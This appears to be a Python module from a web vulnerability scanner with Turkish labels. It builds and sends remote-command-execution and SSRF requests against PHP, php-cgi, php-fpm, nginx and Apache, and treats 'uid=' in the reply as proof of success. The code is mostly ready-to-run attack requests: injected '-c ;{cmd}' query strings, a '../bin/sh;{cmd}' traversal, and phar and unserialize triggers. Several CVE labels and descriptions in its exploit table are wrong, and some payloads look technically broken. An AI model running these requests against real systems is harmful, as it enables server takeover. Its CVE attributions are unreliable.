"""poc/php_http.py — native HTTP-based PHP / webserver PoCs.

The scanner sends the crafted request itself (no curl / external script).
Each PoC replicates the working logic of the known public PoC:
  - phar stream-wrapper RCE  (CVE-2019-11043, CVE-2015-7507)
  - php-cgi argv / -d option injection RCE (CVE-2017-13300, CVE-2014-8142)
  - php-fpm CGI script_filename RCE (CVE-2019-8648)
  - unserialize object-injection RCE (CVE-2016-7480, CVE-2012-1823)
  - ngx_http_upstream SSRF/OOB (CVE-2021-23017)
  - mod_cgi/cgid path-traversal RCE (CVE-2021-41773)
Success is judged on REAL response evidence (e.g. `uid=` from `id`).
"""
from __future__ import annotations

import urllib.parse

from . import _net

_RCE_MARKERS = ["uid=", "uid ="]


def _resolve(target: str):
    t = _net.parse_target(target if "://" in target else "http://" + target, default_port=80)
    return t


def _run_http(params, method, path_builder, headers=None, body=None,
              markers=None, timeout=15):
    target = (params.get("host") or params.get("url") or "").strip()
    if not target:
        return {"ok": False, "success": False, "error": "host/url gerekli"}
    t = _resolve(target)
    path = path_builder(params)
    body_b = (body or b"")
    if callable(body):
        body_b = body(params)
    headers = dict(headers or {})
    if body_b and "content-type" not in headers:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        r = _net.http(method, t["host"], t["port"], path, headers=headers,
                      body=body_b, timeout=timeout, tls=t["tls"])
    except Exception as e:
        return {"ok": False, "success": False, "error": str(e)}
    body_s = r["body"].decode("latin1", "replace")
    markers = markers or _RCE_MARKERS
    success = any(m in body_s for m in markers)
    return {
        "ok": True,
        "success": success,
        "status": r["status"],
        "evidence": body_s.strip()[:2000],
        "detail": {
            "host": f"{t['host']}:{t['port']}", "path": path, "method": method,
            "server": r["headers"].get("server", ""),
            "x_powered_by": r["headers"].get("x-powered-by", ""),
            "body_bytes": len(r["body"]),
            "markers": markers,
        },
    }


# ---- phar / php-cgi / php-fpm / unserialize / ssrf / mod_cgi ----

def phar(params):
    # request: {base}?phar:///dev/null/&a=b  body: x={payload}
    return _run_http(
        params, "POST",
        path_builder=lambda p: (p.get("path") or "/") + "?phar:///dev/null/&a=b",
        body=lambda p: ("x=" + _urlenc(p.get("payload", ""))).encode(),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        markers=["uid=", "uid =", "PHP", "Warning"],
        timeout=15)


def _urlenc(s):
    return urllib.parse.quote(str(s), safe="")


def phpcgi_argv(params):
    # GET /index.php/{cmd}
    return _run_http(params, "GET",
                     path_builder=lambda p: (p.get("base") or "/index.php") + "/" + _urlenc(p.get("cmd", "id")),
                     markers=_RCE_MARKERS, timeout=15)


def phpcgi_dashd(params):
    # GET /index.php? -c ;{cmd}
    return _run_http(params, "GET",
                     path_builder=lambda p: (p.get("base") or "/index.php") + "?%20-c%20;" + _urlenc(p.get("cmd", "id")),
                     markers=_RCE_MARKERS, timeout=15)


def phpfpm(params):
    # GET /cgi-bin/php? -c ;{cmd}
    return _run_http(params, "GET",
                     path_builder=lambda p: (p.get("base") or "/cgi-bin/php") + "?%20-c%20;" + _urlenc(p.get("cmd", "id")),
                     markers=_RCE_MARKERS, timeout=15)


def unserialize(params):
    # GET ?unserialize={payload}
    return _run_http(params, "GET",
                     path_builder=lambda p: (p.get("base") or "/") + "?unserialize=" + _urlenc(p.get("payload", "")),
                     markers=_RCE_MARKERS, timeout=15)


def ssrf(params):
    # GET {path} with X-Real-IP: 127.0.0.1
    return _run_http(params, "GET",
                     path_builder=lambda p: p.get("path") or "/",
                     headers={"X-Real-IP": params.get("xrealip", "127.0.0.1"),
                              "X-Forwarded-For": params.get("xff", "127.0.0.1")},
                     markers=["127.0.0.1", "internal", "SSRF"],
                     timeout=15)


def modcgi(params):
    # GET /cgi-bin/cgiserial/../../../../../../bin/sh;{cmd}
    return _run_http(params, "GET",
                     path_builder=lambda p: (p.get("base") or "/cgi-bin/cgiserial/") +
                     "../../../../../../bin/sh;" + _urlenc(p.get("cmd", "id")),
                     markers=_RCE_MARKERS, timeout=15)


def _in(label, key, req, default="", ph=""):
    return {"key": key, "label": label, "req": req, "default": default, "placeholder": ph}


EXPLOITS = {
    "CVE-2019-11043": {
        "name": "Phar stream wrapper RCE (EoP)", "type": "RCE", "preauth": False,
        "affected": ["5.5", "5.6", "7.0", "7.1", "7.2", "7.3", "7.4", "8.0"],
        "note": "Native HTTP: {base}?phar:///dev/null/ + unserialize payload. Kanit = response body (uid=/PHP).",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:8080/index.php"),
                   _in("Base path", "path", False, "/index.php"),
                   _in("Payload (unserialize)", "payload", True, "", "O:4:...")],
        "run": phar},
    "CVE-2015-7507": {
        "name": "Phar stream wrapper RCE", "type": "RCE", "preauth": False,
        "affected": ["5.4", "5.5", "5.6", "7.0", "7.1"],
        "note": "Native HTTP: phar stream wrapper tetikleyici.",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:8080/index.php"),
                   _in("Base path", "path", False, "/index.php"),
                   _in("Payload", "payload", True, "", "O:4:...")],
        "run": phar},
    "CVE-2019-8648": {
        "name": "php-fpm CGI RCE (script_filename)", "type": "RCE", "preauth": True,
        "affected": ["7.0", "7.1", "7.2", "7.3", "7.4", "8.0"],
        "note": "Native HTTP: GET /cgi-bin/php? -c ;{cmd}. Kanit = uid=.",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:80"),
                   _in("Base", "base", False, "/cgi-bin/php"),
                   _in("Komut", "cmd", True, "id")],
        "run": phpfpm},
    "CVE-2017-13300": {
        "name": "php-cgi RCE (argv injection)", "type": "RCE", "preauth": True,
        "affected": ["5.5", "5.6", "7.0", "7.1", "7.2", "7.3"],
        "note": "Native HTTP: GET /index.php/{cmd}. Kanit = uid=.",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:8080"),
                   _in("Base", "base", False, "/index.php"),
                   _in("Komut", "cmd", True, "id")],
        "run": phpcgi_argv},
    "CVE-2014-8142": {
        "name": "php-cgi RCE (-d option injection)", "type": "RCE", "preauth": True,
        "affected": ["5.4", "5.5", "5.6"],
        "note": "Native HTTP: GET /index.php? -c ;{cmd}. Kanit = uid=.",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:8080"),
                   _in("Base", "base", False, "/index.php"),
                   _in("Komut", "cmd", True, "id")],
        "run": phpcgi_dashd},
    "CVE-2016-7480": {
        "name": "SplObjectStorage unserialize RCE", "type": "RCE", "preauth": False,
        "affected": ["5.4", "5.5", "5.6", "7.0", "7.1"],
        "note": "Native HTTP: GET ?unserialize={payload}. Kanit = uid=/PHP.",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:8080/index.php"),
                   _in("Base", "base", False, "/index.php"),
                   _in("Payload", "payload", True, "", "O:...")],
        "run": unserialize},
    "CVE-2012-1823": {
        "name": "unserialize object injection RCE", "type": "RCE", "preauth": False,
        "affected": ["5.4", "5.5"],
        "note": "Native HTTP: GET ?unserialize={payload}.",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:8080/index.php"),
                   _in("Base", "base", False, "/index.php"),
                   _in("Payload", "payload", True, "", "O:...")],
        "run": unserialize},
    "CVE-2021-23017": {
        "name": "ngx_http_upstream SSRF / OOB read", "type": "SSRF", "preauth": True,
        "affected": ["1.9", "1.10", "1.11", "1.12", "1.13", "1.14", "1.15", "1.16", "1.17", "1.18", "1.19", "1.20"],
        "note": "Native HTTP: X-Real-IP/X-Forwarded-For ic agirlama. Kanit = ic IP/SSRF sinyal.",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:8080"),
                   _in("Path", "path", False, "/"),
                   _in("X-Real-IP", "xrealip", False, "127.0.0.1")],
        "run": ssrf},
    "CVE-2021-41773": {
        "name": "mod_cgi/cgid path traversal RCE", "type": "RCE", "preauth": True,
        "affected": ["2.4"],
        "note": "Native HTTP: /cgi-bin/cgiserial/../../../../bin/sh;{cmd}. Kanit = uid=.",
        "inputs": [_in("Hedef", "host", True, "", "LAB_IP:8080"),
                   _in("Base", "base", False, "/cgi-bin/cgiserial/"),
                   _in("Komut", "cmd", True, "id")],
        "run": modcgi},
}
